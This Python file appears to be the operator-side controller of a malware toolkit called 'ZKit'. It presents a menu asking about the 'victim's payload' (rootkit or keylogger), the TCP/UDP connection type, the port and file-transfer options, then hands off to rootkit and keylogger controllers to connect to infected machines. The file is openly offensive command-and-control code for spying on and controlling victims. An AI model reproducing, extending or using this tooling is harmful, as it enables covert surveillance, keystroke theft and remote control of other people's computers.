"Talks to controllers"

import os
import core.lib.controllers.rootkit_controller as r_ctrl
import core.lib.controllers.keylogger_controller as k_ctrl
from core.helper_core import Color, notify


class Main:
    "Talks to controllers . gets info from user and lets user have fun"

    def __init__(self):
        self.col = Color.GetColor
        self.red, self.green, self.blue, self.reset = self.col('red'), self.col(
            'green'), self.col("blue"), self.col("reset")
        if os.name == 'nt':
            from colorama import init  # pylint: disable=C0415; # noqa
            init(convert=True)

        conn, port, type_ = self.get_info()

        if self.validate((conn, port, type_)):
            if type_ == "keylogger": 
                k_ctrl.connect(conn,port)
            else:
                r_ctrl.connect(conn, port, type_)

    def get_info(self):
        "Gets info from user"
        print("Please choose your payload type ? (R)ootkit, (K)eyLogger : ")
        p_type = input("").lower()

        print("What Is The Victims PayLoad ?\n"
              + self.red + "{1}--> Rootkit\n"
              + self.green + "{2}--> KeyLogger*\n"
              + self.blue + "{000}--> Back To Main Menu\n" + self.reset)

        choice = str(input("..> "))
        if choice == "000":
            return ("Error", "Error", "Error")

        if choice == "1":
            print("At The Time Of Creation Of Payload . ZKit Asked About A Connection Type "
                  "What Was It ?\n"
                  + self.red + "{1}--> TCP\n"
                  + self.green + "{2}--> UDP\n"
                  + self.blue + "{000}--> Back To Main Menu" + self.reset)
            choice = str(input("..> "))
            notify(
                "question", "what port did you used ? left empty to use default (1534)")
            port = int(input("..> "))
            type_ = input(
                "Was the payload enchanted with file transfer (Y or N) Choose N for keylogger : ").lower()
            if type_ == "y":
                type_ = 'ft'
            else:
                type_ = 'rootkit'
            if choice == "000":
                return ("Error", "Error", "Error")

            if choice == "1":
                conn = "TCP"
            elif choice == "2":
                conn = "UDP"
            type_ = p_type if p_type == "keylogger" else type_
            return (conn, port, type_)
        notify("notify",
               "Invalid Input {" + "{}".format(choice) + "}")
        return ("Error", "Error", "Error")

    @ staticmethod
    def validate(con_tuple: tuple) -> bool:
        "validates data from user"
        conn, port, type_ = con_tuple
        return conn in ["TCP", "UDP"] and isinstance(port, int) and type_ in ["ft", "rootkit", "keylogger"]
